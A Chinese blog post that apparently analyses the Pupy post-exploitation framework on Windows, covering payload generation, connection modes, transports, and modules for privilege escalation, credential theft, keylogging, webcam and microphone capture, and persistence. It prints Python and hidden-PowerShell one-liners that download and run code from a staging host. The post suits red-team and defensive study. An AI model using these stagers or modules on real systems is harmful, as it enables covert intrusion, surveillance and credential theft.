---
layout: post
title: Pupy利用分析——Windows平台下的功能
---


## 0x00 前言
---

[Pupy](https://github.com/n1nj4sec/pupy)是使用Python开发的跨平台远程管理和后期开发工具，支持很多实用的功能。

本文将要对Pupy在Windows平台的启动文件类型、连接方式和通信协议进行介绍，将其中的后渗透模块进行分类，逐个介绍功能

## 0x01 简介
---

本文将要介绍以下内容：

- 安装方法
- 支持的启动文件类型
- 支持的连接方式
- 支持的通信协议
- 后渗透模块介绍

## 0x02 安装方法
---

### 1. 使用docker

说明文档：

https://github.com/n1nj4sec/pupy/wiki/Installation

### 2.直接安装

```
git clone --recursive https://github.com/n1nj4sec/pupy
cd pupy
python create-workspace.py -DG pupyws
pupyws/bin/pupysh
```

**注:**

使用`-DG`参数将从https://github.com/n1nj4sec/pupy/releases/download/latest/payload_templates.txz下载模板文件

## 0x03 支持的启动文件类型
---

启动pupy后，输入`gen -h`获得生成启动文件的说明，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-4-8/2-1.png)

这里逐个进行介绍

### 1.client

生成exe格式的文件

生成64位exe文件的命令示例：

```
gen -f client -A x64
```

这个命令将从`pupy/pupy/payload_templates/`读取模板文件，添加配置信息后生成最终的exe文件

**注：**

上述命令对应的模板文件名称为pupyx64.exe，模板文件对应的下载链接：https://github.com/n1nj4sec/pupy/releases/download/latest/payload_templates.txz

### 2.py

生成一个完全打包的Python文件（所有依赖项都从内存打包并执行）

命令示例：

```
gen -f py
```

这个命令会生成一个Python文件，内容的格式如下：

```
import zlib,marshal;exec marshal.loads(zlib.decompress('xxxxxxxxx')
```

其中`'xxxxxxxxx'`为加密的内容

加密的方法大致为使用`marshal.dumps`对代码进行序列化，再加上偏移、异或等操作，具体加密算法可参考：

https://github.com/n1nj4sec/pupy/blob/5b9529a0ea07bb4246a57bfb1c1129010c948931/pupy/pupylib/utils/obfuscate.py#L9

如果想要取消加密过程并获得源文件，可以加上`--debug`参数，示例如下：

```
gen -f py --debug
```

对应代码位置：https://github.com/n1nj4sec/pupy/blob/5b9529a0ea07bb4246a57bfb1c1129010c948931/pupy/pupylib/payloads/py_oneliner.py#L43

代码判断逻辑如下：

```
if debug:
    return payload
return compress_encode_obfs(payload, main=True)
```

如果要在Windows系统的Python环境下运行这个Python文件，Windows系统还需要安装以下模块：

- pywin32
- pycryptodome
- Crypto

**注：**

Crypto包需要从http://www.voidspace.org.uk/python/modules.shtml#pycrypto 处下载

### 3.pyinst

生成与pyinstaller兼容的Python文件

命令示例：

```
gen -f pyinst
```

同`gen -f py`的区别：添加了一些头文件，便于使用pyinstaller将Python脚本转换成exe文件

在之前的文章[《本地密码查看工具LaZagne中的自定义脚本开发》](https://3gstudent.github.io/3gstudent.github.io/%E6%9C%AC%E5%9C%B0%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8B%E5%B7%A5%E5%85%B7LaZagne%E4%B8%AD%E7%9A%84%E8%87%AA%E5%AE%9A%E4%B9%89%E8%84%9A%E6%9C%AC%E5%BC%80%E5%8F%91/)介绍过pyinstaller的用法

### 4.py_oneliner

通过urllib库从服务器下载Python代码并执行

命令示例：

```
gen -f py_oneliner
```

在命令行输出下载执行的代码，示例：

```
python -c 'import urllib;exec urllib.urlopen("http://192.168.1.1:9000/a0py9Yz5pi/Sg11A11q2J").read()'
```

### 5.ps1

生成powershell格式的启动代码，执行时会先启动Powershell进程，然后在Powershell进程中加载dll

生成32位文件的命令示例：

```
gen -f ps1
```

这个命令将从`pupy/pupy/payload_templates/`读取dll的模板文件，添加配置信息和经过混淆的[Invoke-ReflectivePEInjection](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1)代码，最终实现在Powershell进程中加载dll

**注：**

上述命令对应的模板文件名称为pupyx86.dll

### 6.ps1_oneliner

通过`IEX(New-Object Net.WebClient).DownloadString`从服务器下载powershell代码并执行

命令示例：

```
gen -f ps1_oneliner
```

在命令行输出下载执行的代码，示例：

```
powershell.exe -w hidden -noni -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.1:9000/DfsP5d2GPG/xDrhpNdNTU');"
```

在命令行输出执行base64编码的代码，示例：

```
powershell.exe -w hidden -noni -nop -enc xxxxxxxxxxxxxxxxxxxx
```

### 7.rubber_ducky

生成一个Rubber Ducky脚本和inject.bin文件

命令示例：

```
gen -f rubber_ducky
```

### 8.csharp

生成C#文件(.cs格式)

命令示例：

```
gen -f csharp
```

这个命令将从`pupy/pupy/payload_templates/`读取dll格式的模板文件，添加配置信息，使用Casey Smith的PELoader从内存加载PE文件

**注：**

上述命令对应的模板文件名称为pupyx86.dll

C#文件的编译和使用方法可参考之前的文章[《通过.NET实现内存加载PE文件》](https://3gstudent.github.io/3gstudent.github.io/%E9%80%9A%E8%BF%87.NET%E5%AE%9E%E7%8E%B0%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BDPE%E6%96%87%E4%BB%B6/)

### 9..NET

生成C#文件(.cs格式)并通过mono编译，最终生成exe格式的文件

命令示例：

```
gen -f .NET
```

**注：**

需要安装mono开发环境，kali安装命令为`apt-get install mono-mcs`

关于mono的使用可以参考之前的文章[《通过Mono(跨平台.NET运行环境)执行shellcode》](https://3gstudent.github.io/3gstudent.github.io/%E9%80%9A%E8%BF%87Mono(%E8%B7%A8%E5%B9%B3%E5%8F%B0.NET%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83)%E6%89%A7%E8%A1%8Cshellcode/)

这个命令是在`gen -f csharp`的基础上，添加了使用mono编译的功能

### 10..NET_oneliner

通过powershell从内存加载.NET程序集

命令示例：

```
gen -f .NET_oneliner
```

在命令行输出Powershell代码，示例：

```
powershell -w hidden -enc "xxxxxxxxxxxxxx"
```

这个命令是在`gen -f .NET`的基础上，添加了通过powershell从内存加载.NET程序集的功能

powershell从内存加载.NET程序集的实现代码如下：

```
[Reflection.Assembly]::Load(""(new-object net.webclient).DownloadData(""'http://{link_ip}:{port}{landing_uri}')).GetTypes()[0].GetMethods("")[0].Invoke($null,@())"
```

之前的文章[《从内存加载.NET程序集(Assembly.Load)的利用分析》](https://3gstudent.github.io/3gstudent.github.io/%E4%BB%8E%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD.NET%E7%A8%8B%E5%BA%8F%E9%9B%86(Assembly.Load)%E7%9A%84%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/)分析过从内存加载.NET程序集的方法

### 补充：额外的参数

对于生成的启动文件，还支持以下参数：

- 是否压缩
- 是否使用系统代理
- 设置连接次数和间隔时间
- 设置启动前执行的Python脚本

## 0x04 支持的连接方式
---

支持以下四种：

- bind，绑定端口，作为正向连接使用
- auto_proxy，检索可能的SOCKS/HTTP代理列表并使用，检索方法包括：注册表，WPAD请求，gnome设置，环境变量HTTP_PROXY
- dnscnc，dns协议？（这个功能暂时无法测试）
- connect，默认方式，反向连接到服务器

## 0x05 支持的通信协议
---

可通过命令`gen -l`获得列表

说明文档：

https://github.com/n1nj4sec/pupy/wiki/Get-Started#transport

目前支持以下类别：

- obfs3
- http
- ssl
- ecm
- tcp_cleartext
- dfws
- rsa
- udp_secure
- kc4
- ec4
- ws
- scramblesuit
- udp_cleartext
- ssl_rsa

以上类别的通信协议可以进行自定义，修改位置：`pupy/pupy/network/transports/<transport_name>/conf.py`

## 0x06 后渗透模块介绍
---

常用命令:

设置监听端口：`listen -a ssl 8443`

查看会话：`sessions`

切换会话：`sessions -i <id>`

结束会话：`sessions -k <id>`

用法实例如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-4-8/3-1.png)

获得session后输入`help -M`可以显示支持的后渗透模块，这里将其中的后渗透模块进行分类，逐个介绍功能

### 1.提权

(1)使用beroot获得可用来提权的信息，模块：beroot

源码地址：https://github.com/AlessandroZ/BeRoot

(2)使用WinPwnage尝试提权，模块：bypassuac

源码地址：https://github.com/rootm0s/WinPwnage

(3)切换至system权限，模块：getsystem

(4)使用WindowsPowerShell ADIDNS/LLMNR/mDNS/NBNS欺骗者/中间人工具Inveigh，模块：inveigh

源码地址：https://github.com/Kevin-Robertson/Inveigh

### 2.进程

(1)列出/模拟进程token，模块：impersonate

关于token的利用方法可以参考之前的文章[《渗透技巧——Token窃取与利用》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/)

(2)获得当前权限，模块：getprivs

关于权限的利用方法可以参考之前的文章[《渗透技巧——Windows Token九种权限的利用》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows-Token%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90%E7%9A%84%E5%88%A9%E7%94%A8/)

(3)获得当前进程的父进程，模块：getppid

通过父进程进行权限切换可以参考之前的文章[《渗透技巧——从Admin权限切换到System权限》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8EAdmin%E6%9D%83%E9%99%90%E5%88%87%E6%8D%A2%E5%88%B0System%E6%9D%83%E9%99%90/)

### 3.凭据获取

(1)使用Lazagne获取凭据，模块：lazagne

源码地址：https://github.com/AlessandroZ/LaZagne/

之前的文章[《本地密码查看工具LaZagne中的自定义脚本开发》](https://3gstudent.github.io/3gstudent.github.io/%E6%9C%AC%E5%9C%B0%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8B%E5%B7%A5%E5%85%B7LaZagne%E4%B8%AD%E7%9A%84%E8%87%AA%E5%AE%9A%E4%B9%89%E8%84%9A%E6%9C%AC%E5%BC%80%E5%8F%91/)曾介绍过LaZagne

(2)从注册表导出本地用户hash，模块：creddump

相关细节可以参考之前的文章[《渗透技巧——通过SAM数据库获得本地用户hash》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%80%9A%E8%BF%87SAM%E6%95%B0%E6%8D%AE%E5%BA%93%E8%8E%B7%E5%BE%97%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7hash/)

(3)监控内存并查找明文凭据，模块：loot_memory

开启后会持续监控内存

(4)从进程内存dump可打印的字符串以供进一步分析，模块：memstrings

可以针对指定进程，输出的格式为文本文件

### 4.网络相关

(1)通过HTTP协议发送Get/Post请求，模块：http

(2)TCP端口扫描，模块：port_scan

(3)端口转发和socks代理，模块：forward

(4)抓包，模块：tcpdump

(5)UPnP操作，模块：igd

(6)从服务器获得证书，模块：x509

### 5.屏幕控制

(1)通过浏览器控制目标屏幕的模块：rdesktop

加载后，通过浏览器能够控制目标的屏幕，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-4-8/3-4.png)

不仅能够查看屏幕内容，也能够发送鼠标和键盘消息

**注：**

这里不使用远程桌面协议(RDP)

(2)使用远程桌面协议(RDP)，模块：rdp

可以用来开启或关闭远程桌面连接，还支持用来验证远程主机的凭据

### 6.监控

(1)键盘和剪贴板记录，模块：keylogger

(2)记录鼠标点击并截图周围区域，模块：mouselogger

(3)截图，模块：screenshot

(4)麦克风录音，模块：record_mic

(5)摄像头拍照，模块：webcamsnap

### 7.获得系统信息

(1)查看日志，模块:logs

不同类型对应不同的颜色，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-4-8/3-3.png)

(2)注册表，模块：reg

包括查询、增加、删除、修改、搜索操作

不同类型对应不同的颜色，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-4-8/3-2.png)

(3)列出本地和远程共享文件夹及权限，模块：shares

(4)查看当前登录用户，模块：w

(5)获取服务信息，模块：services

(6)获取时间，模块：date

(7)检索EC2/DigitalOcean元数据，模块：cloudinfo

(8)查看和修改环境变量，模块：env

(9)虚拟机检测，模块：check_vm

支持识别以下虚拟机：

- Hyper-V
- VMWare
- Virtual PC
- Virtual Box
- Xen Machine
- Qemu machine

识别方法：查询注册表

### 8.执行Python命令

(1)执行单条命令，模块：pyexec

命令示例：

```
pyexec -c "import platform;print platform.uname()"
```

(2)在交互式shell中执行Python命令，模块：pyshell

命令示例：

```
pyshell
import platform
print platform.uname()
```

(3)加载Python包，模块：load_package

### 9.执行cmd命令

(1)通过subprocess执行cmd命令，模块：shell_exec

命令示例：

```
shell_exec whoami
```

(2)在线程上执行的简单popen调用（速度慢但更安全），模块：pexec

命令示例：

```
pexec whoami
```

(3)交互式shell，模块：interactive_shell

修改自[winpty](https://github.com/alxchk/winpty)

(4)执行shellcode，模块：shellcode_exec

(5)内存执行文件，模块：memory_exec

### 10.远程执行cmd命令

使用smbexec/wmiexec实现远程执行命令，模块：psexec

支持使用hash

### 11.维持权限

(1)持久化，模块：persistence

更多方式可参考：https://github.com/3gstudent/Pentest-and-Development-Tips#tips-30-windows-persistence

(2)复制当前Session，模块：duplicate

(3)迁移进程，模块：migrate

### 12.mimikatz

(1)内存加载mimikatz，执行单条命令，模块：mimikatz

(2)内存加载mimikatz，交互式，模块：mimishell

### 13.powerview

(1)直接调用，模块：powerview

(2)使用Python重写，模块：pywerview

### 14.文件操作

(1)上传，模块：upload

(2)下载，模块：download

(3)查看文件或文件夹的属性，模块：stat

(4)编辑文件，模块：edit

(5)写入文件，模块：write

(6)使用`Windows Search Index`搜索文件，模块：isearch

(7)搜索指定目录下所有文件中的字符，模块:search

(8)通过SMB协议访问文件共享，模块:smb

(9)连接远程共享目录并搜索文件，模块:smbspider

### 15.ssh客户端

(1)连接远程ssh服务器并执行命令，模块:ssh

(2)连接远程ssh服务器获得完整交互式会话，模块:sshell

### 16.outlook

与目标用户的Outlook会话交互，模块：outlook

### 17.压缩与解压缩

zip压缩与解压缩，模块：zip

### 18.锁屏

模块：lock_screen

### 19.查看回连Session的信息

(1)获得所有Session的网络信息，模块：netstat

(2)获得当前Session的信息，模块：get_info

(3)查看已获得的凭据信息，命令：creds

(4)查看server的配置信息，命令：config

## 0x07 小结
---

本文介绍了Pupy在Windows平台下的启动文件类型、连接方式和通信协议，将其中的后渗透模块进行分类，逐个介绍功能。



---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)

